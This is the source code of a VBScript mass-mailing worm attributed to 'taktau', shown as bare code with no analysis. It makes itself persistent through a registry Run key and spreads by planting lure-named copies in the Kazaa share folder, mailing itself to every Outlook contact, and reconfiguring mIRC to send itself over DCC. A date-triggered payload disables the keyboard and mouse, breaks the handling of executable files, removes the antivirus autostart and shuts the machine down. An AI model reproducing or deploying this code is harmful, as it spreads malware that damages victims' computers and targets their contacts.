   'Written By: taktau
   on error resume next
   Set huhu = CreateObject("Scripting.FileSystemObject")
   Set waha = CreateObject("WScript.Shell")
   huhu.copyfile wscript.scriptfullname,huhu.GetSpecialFolder(0)& "\system.vbs"
   huhu.copyfile wscript.scriptfullname,waha.regread("HKLM\Software\Kazaa\CloudLoad\ShareDir") & "\xxx-movies.mpeg.vbs"
   huhu.copyfile wscript.scriptfullname,waha.regread("HKLM\Software\Kazaa\CloudLoad\ShareDir") & "\britney-spears-sex.mpeg.vbs"
   huhu.copyfile wscript.scriptfullname,waha.regread("HKLM\Software\Kazaa\CloudLoad\ShareDir") & "\slipnot - wait and bleed.mp3.vbs"
   huhu.copyfile wscript.scriptfullname,waha.regread("HKLM\Software\Kazaa\CloudLoad\ShareDir") & "\system of a down - boom.mp3.vbs"
   huhu.copyfile wscript.scriptfullname,waha.regread("HKLM\Software\Kazaa\CloudLoad\ShareDir") & "\hotcelebs in nude.mpeg.vbs"
   huhu.copyfile wscript.scriptfullname,waha.regread("HKLM\Software\Kazaa\CloudLoad\ShareDir") & "\sex.mpeg.vbs"
   huhu.copyfile wscript.scriptfullname,waha.regread("HKLM\Software\Kazaa\CloudLoad\ShareDir") & "\xxx.jpg.vbs"
   huhu.copyfile wscript.scriptfullname,waha.regread("HKLM\Software\Kazaa\CloudLoad\ShareDir") & "\*.mp3.vbs"
   waha.regwrite "HKCU\SOFTWARE\test\", 1
   waha.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\System32", huhu.GetSpecialFolder(0)& "\system.vbs"

   Dim x
   on error resume next
   Set fso ="Scripting.FileSystem.Object"
   Set so=CreateObject(fso)
   Set ol=CreateObject("Outlook.Application")
   Set out= WScript.CreateObject("Outlook.Application")
   Set mapi = out.GetNameSpace("MAPI")
   Set a = mapi.AddressLists(1)
   For x=1 To a.AddressEntries.Count
   Set Mail=ol.CreateItem(0)
   Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
   Mail.Subject="test"
   Mail.Body="test"
   Mail.Attachments.Add Wscript.ScriptFullName
   Mail.Send
   Next
   ol.Quit

   Dim huhu, Drives, Drive, Folder, Files, File, Subfolders, Subfolder
   Set Drives=huhu.drives
   For Each Drive in Drives
   If drive.isready then
   Dosearch drive
   end If
   next

   Function Dosearch(Path)
   Set Folder=huhu.getfolder(path)
   Set Files = folder.files
   For Each File in files
   on error resume next
   If huhu.GetFileName(file.path)="mirc.exe" then
   on error resume next
   huhu.createfolder huhu.GetSpecialFolder(0) & "\winsystem"
   huhu.copyfile path & "\mirc.exe", huhu.GetSpecialFolder(0) & "\winsystem\winsystem.exe"
   huhu.copyfile wscript.scriptfullname,huhu.GetSpecialFolder(0) & "\winsystem\xxx-movies.mpeg.vbs"

   set wawa1 = huhu.CreateTextFile(huhu.GetSpecialFolder(0) & "\winsystem\mirc.ini", True)
   wawa1.WriteLine "[options]"
   wawa1.WriteLine "n0=0,1,0,0,1,1,300,1,0,1,1,0,0,0,0,0,1,0,0,0,4096,0,1,3,0,0,1,1,0,50,1,1"
   wawa1.WriteLine "n1=5,100,0,0,0,0,0,0,2,1,1,1,0,0,1,1,1,1,0,1,1,1,0,0,5,0,1,0,0,0,1,0,0"
   wawa1.WriteLine "n2=0,0,0,1,0,1,1,1,0,60,120,0,0,1,0,0,1,1,1,120,20,10,0,1,1,1,0,1,0,1,0,0,0"
   wawa1.WriteLine "n3=5000,0,0,0,1,0,1,1,1,1,0,1,0,0,1,1,3,1,0,1,0,0,0,1,1,1,0,0,0,0,1,3,180"
   wawa1.WriteLine "n4=1,0,1,0,0,0,9999,0,0,1,1,0,1024,0,1,99999,60,0,0,0,3,1,1,3,1,5000,1,5,0,0,3,0,1,1"
   wawa1.WriteLine "n5=1,1,1,1,1,1,1,1,1,1,6667,0,1,0,0,0,1,0,300,30,10,0,1,26,0,0,1,8192,1,0,0,82"
   wawa1.WriteLine "n6=0,0,0,1,0,0,0,0,0,0,0,0,1,0,1,0,0,1,0,0,0,0,100,1,1,0,0,1,0,0,7,1,0"
   wawa1.WriteLine "n7=1,0,0,0,0,0,0,1,1,1,1,1,0,1,0,0,1,70,0,3,0,1,1,1,1,1,0,0,0,0,1,1,1"
   wawa1.WriteLine "[ident]"
   wawa1.WriteLine "active=yes"
   wawa1.WriteLine "userid=man"
   wawa1.WriteLine "system=UNIX"
   wawa1.WriteLine "port=113"
   wawa1.WriteLine "[mirc]"
   wawa1.WriteLine "user=elo"
   wawa1.WriteLine "nick=RizaLL"
   wawa1.WriteLine "email=s"
   wawa1.WriteLine "host=java.webchat.orgSERVER:java.webchat.org:6665GROUP:java"
   wawa1.WriteLine "anick=AbgManje"
   wawa1.WriteLine "[local]"
   wawa1.WriteLine "local=network"
   wawa1.WriteLine "localip=217.0.0.1"
   wawa1.WriteLine "longip=3680289316"
   wawa1.WriteLine "[about]"
   wawa1.WriteLine "version=6.01"
   wawa1.WriteLine "show=BR26354"
   wawa1.WriteLine "[dde]"
   wawa1.WriteLine "ServerStatus=on"
   wawa1.WriteLine "ServiceName=mIRC"
   wawa1.WriteLine "CheckName=off"
   wawa1.WriteLine "[rfiles]"
   wawa1.WriteLine "n0=remote.ini"
   wawa1.WriteLine "n1=remote.ini"
   wawa1.WriteLine "n2=winsystem.ini"
   wawa1.Close

   set wawa2 = huhu.CreateTextFile(huhu.GetSpecialFolder(0) & "\winsystem\winsystem.ini", True)
   wawa2.WriteLine "[script]"
   wawa2.WriteLine "n0=on *:start:{ .timer 0 0 .showmirc -t | .nick $read nick.txt | identd on $read nick.txt | .fullname $read nick.txt | .emailaddr $read nick.txt | .server irc.dal.net }"
   wawa2.WriteLine "n1=on *:connect:{ .join #test }"
   wawa2.WriteLine "n2=on *:join:#:{ $iif($me != $nick, .timer 1 10 .dcc send $nick xxx-movies.mpeg.vbs, return) }"
   wawa2.Close

   set wawa3 = huhu.CreateTextFile(huhu.GetSpecialFolder(0) & "\winsystem\nick.txt", True)
   wawa3.WriteLine "maiisarah"
   wawa3.WriteLine "shafarina"
   wawa3.WriteLine "wahiddah"
   wawa3.WriteLine "lonelygurl"
   wawa3.WriteLine "missedgirl"
   wawa3.WriteLine "far|sha"
   wawa3.WriteLine "twistedangeL"
   wawa3.WriteLine "mylonelygal"
   wawa3.WriteLine "my-girl"
   wawa3.Close

   End if
   next

   Set Subfolders = folder.SubFolders
   For Each Subfolder in Subfolders
   Dosearch Subfolder.path
   next
   end function

   waha.Run huhu.GetSpecialFolder(0) & "\winsystem\winsystem.exe"

   If (Month(Now) = 31) and (Day(Now) = 12) Then
   on error resume next
   MsgBox "Heppi new year!", 0, "Test"
   shell "%windir%\rundll32.exe keyboard,disable"
   shell "%windir%\rundll32.exe mouse,disable"
   waha.regwrite "HKLM\System\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName", "test"
   waha.regwrite "HKLM\Network\Logon\username", "test"
   waha.regwrite "HKCR\exefile\shell\open\command\", "test"
   waha.regdelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\NAV Agent" '
   set wawa = fso.CreateTextFile(fso.GetSpecialFolder(0) & "\test.htm", True)
   wawa.WriteLine "<html><head><title>test Was Here</title></head><body>"
   wawa.WriteLine ":p"
   wawa.Close
   waha.regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", fso.GetSpecialFolder(0) & "\test.htm"
   shell "rundll32.exe user.exe,exitwindows"
   shell "Shutdown.exe -s",vbMaximizeFocus -r
   End If
   'End. Thankx!
